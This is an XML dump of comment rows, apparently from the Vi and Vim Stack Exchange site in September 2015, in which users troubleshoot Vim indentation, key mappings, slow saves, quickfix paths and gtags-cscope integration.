  <row Id="7266" PostId="4760" Score="1" Text="@muru Yes that would appear correct. I seems related to the recent ncurses update. Here's some info info: https://github.com/Rip-Rip/clang_complete/issues/453 and https://bbs.archlinux.org/viewtopic.php?id=202590." CreationDate="2015-09-20T18:59:35.193" UserId="3354" />
  <row Id="7267" PostId="4760" Score="0" Text="Thanks for responses. However, vim still behaves incorrectly when I move _all_ plugins to a temporary directory - that is, I empty the `bundle` directory. And it still does seem entierly dependent on the `filetype` line in my `.vimrc`." CreationDate="2015-09-20T19:16:43.693" UserId="4589" />
  <row Id="7268" PostId="4781" Score="0" Text="I prefer to avoid installing a win32 perl implementation if that is fair to preclude as a potential solution.  While I would expect that path to work, seems that I should be able to avoid doing so, yes?" CreationDate="2015-09-20T19:20:31.470" UserId="2498" />
  <row Id="7269" PostId="4784" Score="0" Text="Might have something to do with tags you're surrounding them with: [How do I get vim to auto indent block-level html elements?](http://vi.stackexchange.com/q/3645/205) ... Nope. Vim indents it just fine for me on Ubuntu 14.04, patch level 843 (pi-rho's PPA)." CreationDate="2015-09-20T23:33:33.343" UserId="205" />
  <row Id="7270" PostId="4784" Score="0" Text="@muru I struggled to believe it would not work for block - but that it would work for inline elements, thanks for eliminating that as a possibility. I have got a solution. will post an answer now." CreationDate="2015-09-21T00:05:54.070" UserId="4603" />
  <row Id="7271" PostId="4785" Score="1" Text="You didn't have `filetype indent on`? O.o I usually have `filetype plugin indent on` so that all three (filetype detection, filetype-based plugin and filetype-based indentation are enabled)." CreationDate="2015-09-21T00:21:42.807" UserId="205" />
  <row Id="7272" PostId="4785" Score="0" Text="@muru I wasnt explicitly setting it in my `.vimrc` - other than that I dont know how to check whether `filetype indent` is  `on` or `off`. I just know when I applied `:filetype indent on` and  `:set smartindent ` auto indent started working" CreationDate="2015-09-21T00:26:56.097" UserId="4603" />
  <row Id="7273" PostId="4786" Score="0" Text="How did you set up iTerm to use `Cmd` as `Meta`? Also, could you clarify what you mean when you say *&quot;It would be nice if the things that can be done on the command line could also be done in insert mode.&quot;*?" CreationDate="2015-09-21T11:35:08.770" UserId="54" />
  <row Id="7274" PostId="4786" Score="0" Text="@romainl: Under profiles/keys, I set right opt = esc+, left opt = option. Then, under keys, I set right opt = right cmd, and left and right command = right opt. For second q, I’ll edit." CreationDate="2015-09-21T11:41:20.387" UserId="4505" />
  <row Id="7275" PostId="4789" Score="0" Text="Unfortunately the best way to debug your plugins as far as I know is to disable them one by one. Also netrw is considered by a lot of vimmers as old and buggy you might be interested in using another explorer plugin :-)" CreationDate="2015-09-21T13:31:24.823" UserId="1841" />
  <row Id="7277" PostId="4786" Score="0" Text="Is this what you are looking for: `:set macmeta`? If this option is set you can map things like `&lt;M-a&gt;`  (Alt-a)." CreationDate="2015-09-21T14:41:15.097" UserId="3316" />
  <row Id="7278" PostId="4786" Score="0" Text="@Andreas: Do you know if this can be done in the terminal version?" CreationDate="2015-09-21T15:10:36.720" UserId="4505" />
  <row Id="7279" PostId="4786" Score="0" Text="@Lawrence Just tried it in the terminal in OSX. It didn't like it. I use it in MacVim" CreationDate="2015-09-21T15:16:30.060" UserId="3316" />
  <row Id="7280" PostId="4795" Score="0" Text="Yes, that's it! I just failed in finding the name of the buffer:-)" CreationDate="2015-09-21T17:50:07.133" UserId="2961" />
  <row Id="7283" PostId="4800" Score="0" Text="What do you mean exactly by &quot;It crashed my instance&quot;? Because I just tried to execute a loop echoing 200 lines with `:'&lt;,'&gt;w !bash | less` and it seems to work perfectly on a terminal vim 7.4 on Debian. I can move up and down the lines with `j` and `k` and go back to the buffer with `q`." CreationDate="2015-09-22T00:31:36.197" UserId="1841" />
  <row Id="7284" PostId="4800" Score="0" Text="I cant remember the shell command I ran but it vim showed a bunch of errors then locked up vim. after that I also read that the | character has a different meaning on vims command prompt, so after that I didnt risk trying piping into less. will give it another go though" CreationDate="2015-09-22T00:43:13.870" UserId="4603" />
  <row Id="7286" PostId="4800" Score="0" Text="Indeed in vim command line `|` can be used to separate commands, so you can give multiple commands in one. But as you use `!` you're calling external shell command so in your example it works as a classical shell pipe. Give us an update and more details when you'll have reproduced you the crashing with the pipe :-)" CreationDate="2015-09-22T01:12:43.667" UserId="1841" />
  <row Id="7288" PostId="4800" Score="0" Text="@statox thanks, I tried piping into less again, and it worked once. However  I just tried executing a long list of echo statements - I thought executing interactive commands like `read` would cause problems so I avoided that. Im getting `E388: Couldn't find definition`. again vim unresponsive - so Ive had to kill the shell process" CreationDate="2015-09-22T03:15:59.447" UserId="4603" />
  <row Id="7289" PostId="4800" Score="0" Text="`E388` indicates that the definition of a function or of a variable can't be found ([`:h E388`](http://vimdoc.sourceforge.net/htmldoc/tagsrch.html#E388)) so are you sure your script is working? Did you tried to execute it directly from your shell (not in vim)?" CreationDate="2015-09-22T03:23:04.087" UserId="1841" />
  <row Id="7290" PostId="4800" Score="0" Text="ah, yes the script is working when invoked from a bash command prompt. Also, I tried simply executing a block of echo statements and piping into less - to eliminate the possibility it could be something in the shell script itself. again its crashing. this time it executes shell commands and correctly loads less with content, then when I `q` out of less. I get an unresponsive vim. this time the `E388` only came up after I started trying commands to regain control over vim , in this case `ctrl-c`" CreationDate="2015-09-22T03:31:26.500" UserId="4603" />
  <row Id="7291" PostId="4800" Score="0" Text="Let us [continue this discussion in chat](http://chat.stackexchange.com/rooms/29386/discussion-between-statox-and-user4668401)." CreationDate="2015-09-22T05:03:09.210" UserId="1841" />
  <row Id="7292" PostId="4734" Score="0" Text="@zool Regarding the downloaded color schemes: I downloaded them again, followed the installation instructions (put the solarized.vim file in folder ~/.vim/colors) but still get these error messages, I don't understand..." CreationDate="2015-09-22T07:43:44.807" UserId="4446" />
  <row Id="7293" PostId="4734" Score="0" Text="@zool The command `:hi htmlBold ctermfg=#ff0000 guifg=#ff0000` gives the following error message: `E421: Color name or number not recognized: ctermfg=#ff0000 guifg=#ff0000`" CreationDate="2015-09-22T07:44:34.837" UserId="4446" />
  <row Id="7294" PostId="4734" Score="0" Text="&quot;Allow bold text&quot; is checked in Terminal preferences, so that is definitely not the problem. I'm trying in both gnome-terminal and xfce4-terminal btw." CreationDate="2015-09-22T07:45:09.593" UserId="4446" />
  <row Id="7295" PostId="4804" Score="0" Text="Yes, I looked it up before, but this definition does not explain the performance difference of these two commands." CreationDate="2015-09-22T09:03:22.570" UserId="147" />
  <row Id="7296" PostId="4797" Score="1" Text="Funny thing is, I never thought of that solution as a serious one :)" CreationDate="2015-09-22T09:08:52.250" UserId="1800" />
  <row Id="7297" PostId="4804" Score="0" Text="I guess its caused by one of commands in my .vimrc, since not all the file is created by me, I don't know what kind of command to look for. And the problem persists only with big files. Maybe its caused by file backing up (undofile, swap)?" CreationDate="2015-09-22T09:15:26.630" UserId="147" />
  <row Id="7298" PostId="4799" Score="1" Text="On a side note: you can also use `#` instead of `*` to search backwards." CreationDate="2015-09-22T10:01:26.027" UserId="2313" />
  <row Id="7299" PostId="4803" Score="1" Text="Is the buffer modified in both cases?" CreationDate="2015-09-22T10:23:41.897" UserId="71" />
  <row Id="7300" PostId="4803" Score="0" Text="@ChristianBrabandt You are right! I didn't make any changes when used ```:up``` command. ```:up``` also hangs for several seconds. But the question remains, which functionality creates the lag?" CreationDate="2015-09-22T10:35:25.163" UserId="147" />
  <row Id="7301" PostId="4803" Score="0" Text="Is this reproducable when starting vim like vim -u NONE -N file.log or using `:noa :w`?" CreationDate="2015-09-22T12:09:27.580" UserId="71" />
  <row Id="7302" PostId="4800" Score="0" Text="Is the crash reproducible? What Vim version?" CreationDate="2015-09-22T12:10:01.367" UserId="71" />
  <row Id="7304" PostId="4803" Score="0" Text="@ChristianBrabandt No, the lag problem is not reprocessable when using ```vim -u NONE -N file.log``` command to open the file, it takes only a moment to save the changes. And ```:nao``` command is not found." CreationDate="2015-09-22T12:20:18.583" UserId="147" />
  <row Id="7305" PostId="4800" Score="0" Text="VIM - Vi IMproved 7.4 (2013 Aug 10, compiled Jan  2 2014 19:39:32)&#xA;Included patches: 1-52 . OS Ubuntu 14.04.  Setup is as per my question. Command is:  `:'&lt;,'&gt;w !bash | less`" CreationDate="2015-09-22T12:29:20.620" UserId="4603" />
  <row Id="7306" PostId="4800" Score="0" Text="the shell commands I was trying to execute was simple a block of echo comands ,e,g `echo  &quot; * Updating packages&quot; ` about 12 lines of similar echo statements" CreationDate="2015-09-22T12:31:48.810" UserId="4603" />
  <row Id="7307" PostId="4803" Score="0" Text="@niekas the command should be `:noa` or `:noautocmd` instead of _:nao_" CreationDate="2015-09-22T13:43:28.117" UserId="1453" />
  <row Id="7308" PostId="4803" Score="0" Text="use **:noa**. In any case, you might want to debug this further see https://vimhelp.appspot.com/vim_faq.txt.html#faq-2.5" CreationDate="2015-09-22T14:00:48.983" UserId="71" />
  <row Id="7309" PostId="4800" Score="0" Text="So not reproducible. In case it happens again, please report back to vim-dev ml" CreationDate="2015-09-22T14:01:38.117" UserId="71" />
  <row Id="7310" PostId="4800" Score="0" Text="ok, it pretty much seems to happen everytime. the steps to reproduce are simply what I posted. My vim / tmux / bash / less setup and config is probably harder to reproduce. If I can provide a worthwhile bug report, I will, thanks" CreationDate="2015-09-22T14:13:49.383" UserId="4603" />
  <row Id="7311" PostId="4786" Score="0" Text="@Andreas: E518: Unknown option: macmeta" CreationDate="2015-09-22T15:19:37.253" UserId="4505" />
  <row Id="7312" PostId="4786" Score="0" Text="I found a good tip on Stack Overflow: map the symbol produced by opt. E.g., since opt+j &gt; ∆, one can `:map ∆ Xi&lt;cr&gt;&lt;esc&gt;`." CreationDate="2015-09-22T15:44:46.437" UserId="4505" />
  <row Id="7313" PostId="4799" Score="0" Text="@SatoKatsura: Right I forgot to mention that, thank for pointing it out." CreationDate="2015-09-22T15:50:29.553" UserId="1841" />
  <row Id="7315" PostId="4806" Score="0" Text="Could you modify your answer to run `compgen` when the `.vimrc` is read?" CreationDate="2015-09-22T19:20:18.813" UserId="4498" />
  <row Id="7316" PostId="4808" Score="0" Text="Thanks for elaborating. It [looks as though `CompilerSet` functions equivalently to `set` and `setlocal`](http://vimdoc.sourceforge.net/htmldoc/usr_41.html#41.13). I'll test it out and let you know if this doesn't work." CreationDate="2015-09-22T19:21:11.940" UserId="800" />
  <row Id="7317" PostId="4803" Score="0" Text="To find out which 'write' autocmds are added by your vimrc, directly or through plugins, you could run `:verbose autocmd {event}` for each write event listed at `:help autocommand-events`. Then do the same after starting Vim with `-u NONE` and compare the result. If the problem is caused by a write autocmd, this should give you a hint where to look." CreationDate="2015-09-22T19:42:13.983" UserId="1306" />
  <row Id="7318" PostId="4806" Score="0" Text="Yeah, answer edited." CreationDate="2015-09-22T20:21:21.427" UserId="54" />
  <row Id="7319" PostId="4808" Score="0" Text="This seems to work, though it confuses the heck out of Vim's syntax highlighter. I've tried coming up with a less verbose solution - in Python I'd use `','.join()`, but setting options from variables/expressions seems like a huge pain in VimL and the docs are vague on how exactly `CompilerSet` is supposed to work, so I haven't figured it out yet" CreationDate="2015-09-22T20:25:07.567" UserId="800" />
  <row Id="7320" PostId="4808" Score="1" Text="@Air actually, after using single quotes for the phrases within the comments instead of double quotes, my Vim highlights it perfectly." CreationDate="2015-09-22T20:27:45.437" UserId="205" />
  <row Id="7321" PostId="4808" Score="0" Text="@Air see: http://i.stack.imgur.com/dA6Gm.png" CreationDate="2015-09-22T20:28:48.490" UserId="205" />
  <row Id="7322" PostId="4803" Score="5" Text="I'm voting to close this question because it is a problem with the asker's .vimrc and that .vimrc is not provided in the question." CreationDate="2015-09-22T20:37:19.673" UserId="8" />
  <row Id="7324" PostId="4814" Score="1" Text="+1 In this case you can probably omit the `3V` as Tabular usually guesses correctly which selection of text you want to operate on." CreationDate="2015-09-22T23:25:29.293" UserId="1306" />
  <row Id="7325" PostId="4804" Score="0" Text="@niekas It does explain the difference if your performance problem is related to writing the buffer to file (which seems likely). When the buffer is not modified, `:update` will not write to file, _ergo_ no problem. In that case, this answers your original question correctly. Nick's answer may be off because _it answers your question, but doesn't solve your problem_. In that case, you might consider accepting this answer and asking your new question in a, well, new question." CreationDate="2015-09-22T23:32:25.887" UserId="1306" />
  <row Id="7326" PostId="4814" Score="0" Text="@jjaderberg You're right I edited my answer. Thanks :-)" CreationDate="2015-09-22T23:35:19.267" UserId="1841" />
  <row Id="7327" PostId="4806" Score="1" Text="It works; the only thing I would add is `set iskeyword+=-` to complete hyphenated commands cleanly." CreationDate="2015-09-23T00:10:59.660" UserId="4498" />
  <row Id="7328" PostId="140" Score="0" Text="While I like this approach, Is there a way to make it toggle comments?" CreationDate="2015-09-23T05:18:16.590" UserId="301" />
  <row Id="7329" PostId="4817" Score="3" Text="&quot;bash history (sometime misleading &quot; ... eh? Have you ever run `!vi`?" CreationDate="2015-09-23T07:03:18.913" UserId="205" />
  <row Id="7330" PostId="4816" Score="1" Text="Actually it _could_ be fixed, by post-processing the output of `ack` / `ag` to call `fnamemodify(file, ':~:.')` on all filenames before feeding it back to be parsed with `errorformat`.  This would involve replacing `makeprg` and `make` (or `Make` from `dispatch`) with `system()` and `cgetexpr`.  Not really a complicated change, but it would involve a change in the philosophical approach to the problem. :)" CreationDate="2015-09-23T07:44:27.247" UserId="1577" />
  <row Id="7331" PostId="4819" Score="0" Text="yes, make me happy:&#xA;alias v=&quot;vim -c':e#&lt;1'&quot;" CreationDate="2015-09-23T08:30:47.917" UserId="983" />
  <row Id="7332" PostId="4823" Score="0" Text="Can't you use GVim instead?" CreationDate="2015-09-23T13:47:22.223" UserId="205" />
  <row Id="7333" PostId="4823" Score="0" Text="No.  GVim is not and wont be installed." CreationDate="2015-09-23T16:00:52.427" UserId="4632" />
  <row Id="7334" PostId="4816" Score="0" Text="@garyjohn Just to make it clear for myself. I see a mixture of output because in some cases there is a certain event happening and after the event Vim resolves the path to relative. In those cases when it doesn't happen the path stays the the same. Am I correct?" CreationDate="2015-09-23T16:09:08.997" UserId="2865" />
  <row Id="7335" PostId="4816" Score="0" Text="@lcd047 Will you be able to guide me through the process of using your approach, i.e `fnamemodify(file, ':~:.')`, etc. I know asking to help on this is a long shot but I've never done anything like this before and would greatly appreciate the help." CreationDate="2015-09-23T16:13:18.480" UserId="2865" />
  <row Id="7336" PostId="4816" Score="0" Text="@flashburn: What I observed was that when I had visited a file, so that it was in my buffer list (`:ls`), it would have a relative path name. Any quickfix &quot;hits&quot; to files already in my buffer list would appear in the quickfix list with the names used for the buffers, i.e., relative path names. Any quickfix &quot;hits&quot; to files not in the buffer list would be added to the buffer list (visible using `:ls!`; note the `!`) with the names as given by the program creating the list, usually full path names. So the initial difference in appearance was due to whether or not I had already opened the file." CreationDate="2015-09-23T17:20:23.030" UserId="2055" />
  <row Id="7337" PostId="4816" Score="0" Text="@garyjohn There seems to be an issue already open with the Ack developer. Someone made a [post](https://github.com/mileszs/ack.vim/issues/143#issuecomment-109558188) about this. They also offered a [solution](https://github.com/mileszs/ack.vim/blob/f04a8a9af3854f9fd97318e05a0e5e05281da33f/autoload/ack.vim#L77). It looks like it is already implemented in Ack but I wonder why it doesn't work." CreationDate="2015-09-23T17:25:44.053" UserId="2865" />
  <row Id="7338" PostId="4816" Score="0" Text="@flashburn: I don't know why it doesn't seem to work. I don't have Ack installed so I can't easily check it out. You could sprinkle some `:echomsg` commands in ack.vim and look in the message history to see what's happening. Or, you could use Vim's debug features (`:help debug-scripts`)." CreationDate="2015-09-23T17:42:06.323" UserId="2055" />
  <row Id="7339" PostId="4816" Score="0" Text="@garyjohn What do you use instead of Ack? Maybe I can switch and use what you use." CreationDate="2015-09-23T17:44:08.427" UserId="2865" />
  <row Id="7340" PostId="4816" Score="1" Text="I use `find`, `ctags`, `gtags` and `grep`. I use `find` in a script with some other filters to build lists of files for `ctags` and `gtags`, then run those programs to build their indexes. The `ctags` index is sorted so that Vim can use a fast binary search. I use `gtags-cscope` as a better `cscope`. I use a Vim script to make an easier interface to Vim's `cscope` commands. I haven't seen any advantage to using `ack` instead of `grep`. When I'm not looking for a symbol with `ctags` or `gtags`, I usually want to search _every_ file in the project. Otherwise, I use `grep`'s `--include=` option." CreationDate="2015-09-23T18:25:08.120" UserId="2055" />
  <row Id="7341" PostId="140" Score="1" Text="@ideasman42 You'd have to make a function instead and check if the current line starts with a comment and then depending on that call either of the `:s` commands shown in the excerpt in the answer. The check itself would be something like `getline('.') =~ &quot;^&quot; . escape(b:comment_leader, '\/')`. If it's true uncomment, otherwise comment. This is not tested and should serve only as an example." CreationDate="2015-09-23T18:26:53.937" UserId="20" />
  <row Id="7342" PostId="4826" Score="0" Text="first of all: thanks statox for grammar corrections. my English is awful I admit. &#xA;Yes, I know how to use session and the:Q and lvim alias simplify all. Good idea. I already do the suspended mode too, but I do not like because I forgot to be in suspended mode and often  I close terminal. I appreciated your long explanantion and voted!" CreationDate="2015-09-23T18:32:29.313" UserId="983" />
  <row Id="7343" PostId="4816" Score="0" Text="@garyjohn Wow!!! You must be really good at using Vim. Thanks for the advice!" CreationDate="2015-09-23T18:57:10.423" UserId="2865" />
  <row Id="7344" PostId="4825" Score="0" Text="I find using `e` with the previous pattern like so, `//e`, to be quite handy. You may also want to take a look at using the `gn` motion. Especially with visual mode which will also accomplish what you are trying to do. See `:h gn` and [Operating on search matches using gn](http://vimcasts.org/episodes/operating-on-search-matches-using-gn/)." CreationDate="2015-09-23T19:00:54.173" UserId="778" />
  <row Id="7345" PostId="4826" Score="1" Text="@Solyaris: no problem for the corrections I also often do mistakes and get corrected that's how the community works :-) I'm glad you like the solution and I don't remember how but I think it is possible to have an indication on your prompt when some process are backgrounded so I'll see how to do that and edit my answer if I find it." CreationDate="2015-09-23T19:09:39.547" UserId="1841" />
  <row Id="7346" PostId="4828" Score="1" Text="Thanks, that's one way to do it. I had already used `-nargs` for a user defined command but never noticed that you could specify `+` (or `*` and `?`) it's good to know!" CreationDate="2015-09-23T20:17:59.267" UserId="1841" />
  <row Id="7347" PostId="4823" Score="0" Text="If it helps: https://wiki.archlinux.org/index.php/Xdg-open" CreationDate="2015-09-23T20:19:39.197" UserId="1800" />
  <row Id="7348" PostId="4833" Score="1" Text="Eeek! If you're going to rely on external facilities anyway, use the `uuidgen` command. Simpler, part of `util-linux`, so highly likely to be installed anyway." CreationDate="2015-09-23T21:04:39.927" UserId="205" />
  <row Id="7349" PostId="4833" Score="0" Text="You're right! I updated the answer, thanks." CreationDate="2015-09-23T21:08:11.613" UserId="1841" />
  <row Id="7350" PostId="4814" Score="0" Text="You might also be interested in [vim-easy-align](https://github.com/junegunn/vim-easy-align). I like particularly the LiveEasyAlign command, which allows real time customization of the align command. This is useful for more advanced cases." CreationDate="2015-09-23T22:01:17.703" UserId="21" />
  <row Id="7351" PostId="4816" Score="0" Text="@garyjohn Do you use gtags-csope with C++ or C code? How do you generate and connect a gtags-cscope database to Vim? I'd would really appreciate your help on this." CreationDate="2015-09-23T22:54:58.873" UserId="2865" />
  <row Id="7352" PostId="4829" Score="1" Text="Note that this strategy may fail if any of those nodes already has an id, particularly an id supplied after the class." CreationDate="2015-09-24T00:10:07.833" UserId="29" />
  <row Id="7353" PostId="4361" Score="0" Text="Since you're using Python anyway, try string formatting like in my post: http://vi.stackexchange.com/a/585/205" CreationDate="2015-09-24T00:13:28.523" UserId="205" />
  <row Id="7354" PostId="4832" Score="1" Text="That would give a invalid `id`, [ref](http://www.w3.org/TR/html401/types.html#type-name). Perhaps something like `return printf('foo%03d', w:count)` if one want to get fancy." CreationDate="2015-09-24T03:14:08.840" UserId="220" />
  <row Id="7355" PostId="4802" Score="0" Text="whoop! works great thanks romainl :)" CreationDate="2015-09-24T04:32:31.703" UserId="4603" />
  <row Id="7356" PostId="4835" Score="1" Text="GNU Global didn't support JavaScript back when I tried it but it worked well with PHP and IIRC the [Vim integration](https://www.gnu.org/software/global/manual/global.html#Vim-editor) was pretty straightforward. Could you detail what you tried and how it failed?" CreationDate="2015-09-24T07:41:52.820" UserId="54" />
  <row Id="7358" PostId="4826" Score="0" Text="that &quot;indication&quot; could help a lot. Let us know! in the meantime I run $ jobs before exiting from the shell. &quot;sessions&quot; solution is perfect for me. pro: more &quot;correct&quot; to really re-edit &quot;last&quot; file, in opposition with simple alias v=&quot;vim -c':e#&lt;1'&quot;, because this last fail in case I edit multiple files once entered in vim (e.g. :e anotherfile.xxx). cons (minor): Session slow down a bit vim startup time." CreationDate="2015-09-24T08:24:04.043" UserId="983" />
  <row Id="7359" PostId="4839" Score="5" Text="No, there is no command to reverse `:only` and no generic way to undo Ex commands." CreationDate="2015-09-24T09:26:54.077" UserId="54" />
  <row Id="7360" PostId="4834" Score="0" Text="Thanks muru, this is a good trick!" CreationDate="2015-09-24T12:09:46.443" UserId="4632" />
  <row Id="7361" PostId="4834" Score="0" Text="@EnricoPirani out of curiosity, what is your `vim --remote` command? Can you add it to the question?" CreationDate="2015-09-24T12:36:25.213" UserId="205" />
  <row Id="7362" PostId="4834" Score="0" Text="you mean the `zsh` snippet?" CreationDate="2015-09-24T13:07:23.860" UserId="4632" />
  <row Id="7363" PostId="4834" Score="0" Text="@EnricoPirani yes, or whatever you will be using in the `.desktop` file." CreationDate="2015-09-24T13:09:34.610" UserId="205" />
  <row Id="7364" PostId="4834" Score="0" Text="For `vim.desktop` as you wrote I used `vim --remote %F`" CreationDate="2015-09-24T13:12:28.397" UserId="4632" />
  <row Id="7365" PostId="4834" Score="0" Text="@EnricoPirani Sigh. Being Vim, I imagined some complex incantation. :D" CreationDate="2015-09-24T13:13:08.707" UserId="205" />
  <row Id="7366" PostId="4819" Score="0" Text="The problem with this is that NerdTree and other unused stuff is inside the oldfiles" CreationDate="2015-09-24T13:21:55.530" UserId="1543" />
  <row Id="7367" PostId="4361" Score="0" Text="@muru Well I'm afraid I have no idea how to do that.  The naive attempt `//\`!p snip.rv = '{:=^76}'.format(' ' + t[1] + ' ')\`//` doesn't work, and neither does `//\`!p snip.rv = '{:=^76}'.format(' ' + t[1] + ' ')\`${1:Solving a big problem}//`.  My knowledge of ultisnips is not up to the task, sorry." CreationDate="2015-09-24T14:03:33.773" UserId="2313" />
  <row Id="7368" PostId="4826" Score="1" Text="@GiorgioRobino: Answer updated with the trick to show background jobs. Also in the cons of using the sessions I'm not sure but if I remember well NerdTree messes up the sessions sometimes so if you use this plugin you might experience some problems." CreationDate="2015-09-24T15:06:11.530" UserId="1841" />
  <row Id="7369" PostId="4504" Score="0" Text="Does not work most of the time..." CreationDate="2015-09-24T15:47:21.480" UserId="3050" />
  <row Id="7370" PostId="4826" Score="1" Text="I like your trick! so your &quot;lighter&quot; solution gain points :) and Yes I use NerdTree plugin too. Anyway your &quot;heavy&quot; solution is interesting for many reasons and I started to use it! thanks" CreationDate="2015-09-24T15:57:03.610" UserId="983" />
  <row Id="7371" PostId="4816" Score="0" Text="Let us [continue this discussion in chat](http://chat.stackexchange.com/rooms/29500/discussion-between-garyjohn-and-flashburn)." CreationDate="2015-09-24T16:14:23.800" UserId="2055" />
  <row Id="7372" PostId="4835" Score="0" Text="@romainl I'm used to regular cscope. What was confusing to me is what file to use for a cross reference for a database. There are multiple files, but I seem to get the same result not matter what I use for a database. The tool doesn't always produce the right result. Have you had any issues with it? [This is the codebase I'm trying to navigate](https://github.com/openrisc/llvm-or1k)" CreationDate="2015-09-24T16:21:00.773" UserId="2865" />
  <row Id="7373" PostId="4835" Score="0" Text="I use GNU global cscope for my PHP projects. I use the instructions found [here](https://www.gnu.org/software/global/manual/global.html#Gtags_002dcscope). Summarized: `:set csprg=gtags-cscope`, `:cs add GTAGS`. Have you at least done these commands?" CreationDate="2015-09-24T16:55:17.770" UserId="778" />
  <row Id="7374" PostId="4839" Score="2" Text="Related plugin: [ZoomWin](http://www.vim.org/scripts/script.php?script_id=508)" CreationDate="2015-09-24T16:57:33.713" UserId="778" />
  <row Id="7375" PostId="4835" Score="0" Text="@PeterRincker Yes I have. I doesn't always find the right &quot;thing&quot; for me." CreationDate="2015-09-24T17:25:38.797" UserId="2865" />
  <row Id="7376" PostId="4828" Score="0" Text="I edited your answer to add the autocomplete based on commands to your `Windo` command, this way its behavior is closer to the original `windo`. I hope you don't mind, it wasn't worth another answer just to add this detail." CreationDate="2015-09-24T17:58:27.227" UserId="1841" />
  <row Id="7377" PostId="4842" Score="0" Text="Another way to fix &quot;make&quot; directory: use the QuickfixCmdPre autocmd, and search up until you find a directory containing a makefile. Change directories to that location." CreationDate="2015-09-24T18:03:56.223" UserId="1094" />
  <row Id="7378" PostId="4803" Score="0" Text="Also possible: creating the undo file may take some time, if enabled in the vimrc. Probably not several seconds, however." CreationDate="2015-09-24T18:05:41.727" UserId="1094" />
  <row Id="7379" PostId="562" Score="0" Text="@hildred: Not sure you get anything from it, but posted it at last ..." CreationDate="2015-09-24T19:34:07.320" UserId="220" />
  <row Id="7381" PostId="4844" Score="2" Text="Maybe `nnoremap &lt;CR&gt; :nohl&lt;CR&gt;&lt;C-L&gt;`?" CreationDate="2015-09-24T20:31:37.830" UserId="1841" />
  <row Id="7382" PostId="4844" Score="0" Text="@statox: thanks! what does &lt;c-l&gt; do?" CreationDate="2015-09-24T20:35:07.880" UserId="4505" />
  <row Id="7383" PostId="4844" Score="0" Text="It redraws the screen ([`:h CTRL-L`](http://vimdoc.sourceforge.net/htmldoc/various.html#CTRL-L)). Does the mapping works properly? I havent tested it so I'd like to have a confirmation before I make it an answer :-)" CreationDate="2015-09-24T20:37:47.320" UserId="1841" />
  <row Id="7384" PostId="4844" Score="0" Text="@statox: yes. except I discovered that multiple highlights are only showed after `&lt;cr&gt;`; but the mapping works with the 2nd `&lt;cr&gt;`." CreationDate="2015-09-24T20:48:57.960" UserId="4505" />
  <row Id="7385" PostId="4846" Score="0" Text="But it would not? `\,` and `\3` are perfectly valid command sequence names." CreationDate="2015-09-24T20:51:58.250" UserId="4505" />
  <row Id="7386" PostId="4846" Score="0" Text="Edited with some digging." CreationDate="2015-09-24T21:21:44.270" UserId="1800" />
  <row Id="7387" PostId="4846" Score="0" Text="I tried but it didn’t work. I don’t think I have the file you cited. Are you using vim-latex/latex-suite?" CreationDate="2015-09-24T21:43:08.950" UserId="4505" />
  <row Id="7388" PostId="4846" Score="1" Text="No, you'l have to create the `.../after/syntax/tex.vim` file yourself (see for example http://usevim.com/2012/03/07/syntax-highlighting/ )" CreationDate="2015-09-24T21:48:20.247" UserId="1800" />
  <row Id="7389" PostId="4844" Score="0" Text="I not sure of what 2nd `&lt;CR&gt;` you're talking about, now I have access to a Vim I just tested `nnoremap &lt;CR&gt; :nohl&lt;CR&gt;` (without redraw) and it seems to work properly." CreationDate="2015-09-24T21:57:00.457" UserId="1841" />
  <row Id="7390" PostId="4844" Score="0" Text="I mean it only works after you pressed enter twice; but that makes sense, since you have to press it a first time for all the highlights to show." CreationDate="2015-09-24T21:59:23.603" UserId="4505" />
  <row Id="7392" PostId="4849" Score="4" Text="Or use double quotes and escape. e.g. `execute &quot;normal \&lt;f7&gt;&quot;`. Or even better yet just use `:normal`. e.g. `normal &lt;f7&gt;`" CreationDate="2015-09-24T22:07:25.757" UserId="778" />
  <row Id="7393" PostId="4849" Score="0" Text="@PeterRincker The double quoting doesnt seems to work on my system Debian + xterm + tmux + vim 7.4... maybe it comes from my terminal emulator?" CreationDate="2015-09-24T22:09:40.383" UserId="1841" />
  <row Id="7394" PostId="4849" Score="0" Text="@statox For some reason your suggestion didn't work. When I executed Ctrl-F7 it inserted `&lt;F7&gt;`" CreationDate="2015-09-24T22:12:04.663" UserId="2865" />
  <row Id="7395" PostId="4849" Score="0" Text="@PeterRincker It worked on my system. What is the difference between single quotes and double quotes?" CreationDate="2015-09-24T22:12:53.283" UserId="2865" />
  <row Id="7396" PostId="4849" Score="0" Text="@flashburn In your comment you wrote you used `Ctrl + F7` but I suggested to use `Ctrl + v + F7` I'm not sure if you just forgot it in your comment or if you didn't see it in my answer?" CreationDate="2015-09-24T22:14:16.767" UserId="1841" />
  <row Id="7397" PostId="4849" Score="0" Text="@statox Sorry this was a typo. It should be `Ctrl + v + F7`" CreationDate="2015-09-24T22:15:15.110" UserId="2865" />
  <row Id="7398" PostId="4849" Score="0" Text="@flashburn Well I don't know how to explain that... Maybe a Vim expert of the site will know what's happening. Sorry if that didn't help." CreationDate="2015-09-24T22:19:01.620" UserId="1841" />
  <row Id="7401" PostId="4849" Score="0" Text="@statox No worries. Thanks for the effort." CreationDate="2015-09-24T22:53:45.687" UserId="2865" />
  <row Id="7403" PostId="4846" Score="0" Text="Better: `syn match texStatement &quot;\\[^a-zA-Z]&quot;`." CreationDate="2015-09-24T23:30:36.287" UserId="4505" />
  <row Id="7404" PostId="4849" Score="1" Text="To understand the double quote escaping rules I suggest reading `:h expr-quote`. An except: `\&lt;xxx&gt;` Special key named &quot;`xxx`&quot;.  e.g. `&quot;\&lt;C-W&gt;&quot;` for CTRL-W." CreationDate="2015-09-25T00:51:00.103" UserId="778" />
  <row Id="7405" PostId="4849" Score="0" Text="@statox The technique should work across all terminal emulators. I did however make a mistake. You can not do just `normal &lt;f7&gt;`. Sorry for any confusion." CreationDate="2015-09-25T00:58:06.340" UserId="778" />
  <row Id="7406" PostId="4848" Score="0" Text="In my opinion this would be better off in a command. `command! RerfreshTags !gtags&lt;bar&gt;cscope kill -1&lt;bar&gt;cscope add GTAGS`. Then map `&lt;f7&gt;` to this command and execute your the command directly in your function." CreationDate="2015-09-25T01:03:23.120" UserId="778" />
  <row Id="7407" PostId="4847" Score="0" Text="Can't you outsource it? `grep -Fq 'export PATH=~/.composer/vendor/bin:$PATH' ~/.bashrc || ex ...` (or `cat`, for that matter)?" CreationDate="2015-09-25T03:12:28.843" UserId="205" />
